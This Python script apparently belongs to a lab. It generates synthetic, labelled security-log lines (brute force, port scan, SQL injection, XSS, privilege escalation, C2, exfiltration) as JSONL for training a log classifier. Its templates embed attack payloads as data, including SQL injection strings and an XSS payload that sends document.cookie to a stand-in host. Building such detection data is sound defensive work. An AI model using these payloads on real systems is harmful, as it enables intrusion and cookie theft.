"""
Lab 14, step 2: a synthetic security-log classification task.

Eight classes of log lines (web server, auth, firewall, EDR-style process
events), generated from templates with randomised IPs, users, paths, and
timing, plus label noise and "hard negatives" (benign events that look
suspicious). Synthetic so the lab is license-free and reproducible; swap in
your own labelled SOC data for a real evaluation.

Output: prompt/completion JSONL for TRL, split train/val/test.

Usage:
    python make_security_data.py --n 12000 --noise 0.02 --out data/
"""
from __future__ import annotations

import argparse
import json
import random
from pathlib import Path

LABELS = ["benign", "brute_force", "port_scan", "sql_injection", "xss",
          "privilege_escalation", "malware_c2", "data_exfiltration"]
SYSTEM = ("You are a SOC analyst assistant. Classify the log line into exactly one label: "
          + ", ".join(LABELS) + ". Reply with the label only.")


def ip(r):
    return ".".join(str(r.randint(1, 254)) for _ in range(4))


def user(r):
    return r.choice(["admin", "root", "jdoe", "svc_backup", "asmith", "budi", "dewi", "oracle"])


def gen(label: str, r: random.Random) -> str:
    t = f"2025-{r.randint(1, 12):02d}-{r.randint(1, 28):02d}T{r.randint(0, 23):02d}:{r.randint(0, 59):02d}:{r.randint(0, 59):02d}Z"
    if label == "benign":
        return r.choice([
            f'{t} nginx {ip(r)} "GET /static/app.{r.randint(1, 9)}.js HTTP/1.1" 200 {r.randint(800, 90000)}',
            f"{t} sshd[{r.randint(900, 9999)}]: Accepted publickey for {user(r)} from {ip(r)} port {r.randint(1024, 65535)}",
            f"{t} sudo: {user(r)} : TTY=pts/{r.randint(0, 5)} ; COMMAND=/usr/bin/systemctl status nginx",
            # hard negatives: look suspicious, are normal
            f'{t} nginx {ip(r)} "GET /search?q=select+a+plan HTTP/1.1" 200 5123',
            f"{t} sshd[{r.randint(900, 9999)}]: Failed password for {user(r)} from {ip(r)} port {r.randint(1024, 65535)} ssh2",
        ])
    if label == "brute_force":
        return (f"{t} sshd[{r.randint(900, 9999)}]: Failed password for invalid user {user(r)} from {ip(r)} "
                f"port {r.randint(1024, 65535)} ssh2 (attempt {r.randint(40, 900)} in {r.randint(30, 300)}s)")
    if label == "port_scan":
        return (f"{t} kernel: FW DROP IN=eth0 SRC={ip(r)} DST=10.0.0.{r.randint(2, 250)} PROTO=TCP "
                f"SPT={r.randint(40000, 65000)} DPT={r.choice([21, 22, 23, 25, 445, 3389, 8080])} FLAGS=SYN "
                f"({r.randint(200, 5000)} distinct ports/min)")
    if label == "sql_injection":
        pay = r.choice(["' OR '1'='1", "1 UNION SELECT username,password FROM users--", "'; DROP TABLE orders;--",
                        "1 AND SLEEP(5)"])
        return f'{t} nginx {ip(r)} "GET /item?id={pay} HTTP/1.1" {r.choice([200, 500])} {r.randint(100, 9000)}'
    if label == "xss":
        pay = r.choice(["<script>alert(1)</script>", "<img src=x onerror=fetch('//evil.io?c='+document.cookie)>",
                        "javascript:alert(document.domain)"])
        return f'{t} nginx {ip(r)} "POST /comment body={pay} HTTP/1.1" 200 {r.randint(100, 900)}'
    if label == "privilege_escalation":
        return r.choice([
            f"{t} sudo: {user(r)} : user NOT in sudoers ; COMMAND=/bin/bash",
            f"{t} edr: process=/tmp/.x/pwnkit uid=1001 euid=0 parent=bash cmdline='./pwnkit'",
            f"{t} auditd: chmod u+s /usr/bin/find by uid={r.randint(1000, 1999)}",
        ])
    if label == "malware_c2":
        return (f"{t} edr: process=/usr/lib/.cache/update beacon to {ip(r)}:{r.choice([443, 8443, 53])} "
                f"interval={r.choice([60, 300, 900])}s jitter={r.randint(5, 30)}% dns_txt_queries={r.randint(50, 900)}")
    return (f"{t} proxy: {user(r)} {ip(r)} PUT https://{r.choice(['mega.nz', 'transfer.sh', 'paste.ee'])}/u "
            f"bytes_out={r.randint(200, 9000)}MB after_hours=true archive=finance_q{r.randint(1, 4)}.7z")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=12_000)
    ap.add_argument("--noise", type=float, default=0.02, help="label noise rate")
    ap.add_argument("--out", default="data")
    a = ap.parse_args()
    r = random.Random(0)
    rows = []
    for i in range(a.n):
        # 40% benign (realistic class imbalance), the rest uniform over attacks
        label = "benign" if r.random() < 0.4 else r.choice(LABELS[1:])
        line = gen(label, r)
        shown = r.choice(LABELS) if r.random() < a.noise else label
        rows.append({"prompt": [{"role": "system", "content": SYSTEM}, {"role": "user", "content": line}],
                     "completion": [{"role": "assistant", "content": shown}], "label": label})
    r.shuffle(rows)
    out = Path(a.out); out.mkdir(parents=True, exist_ok=True)
    cut1, cut2 = int(0.8 * a.n), int(0.9 * a.n)
    for name, part in [("train", rows[:cut1]), ("val", rows[cut1:cut2]), ("test", rows[cut2:])]:
        with open(out / f"{name}.jsonl", "w") as f:
            for row in part:
                f.write(json.dumps(row) + "\n")
    print(f"[lab14] wrote {cut1}/{cut2 - cut1}/{a.n - cut2} train/val/test to {out}/")
    print("example:", rows[0]["prompt"][1]["content"], "->", rows[0]["label"])


if __name__ == "__main__":
    main()
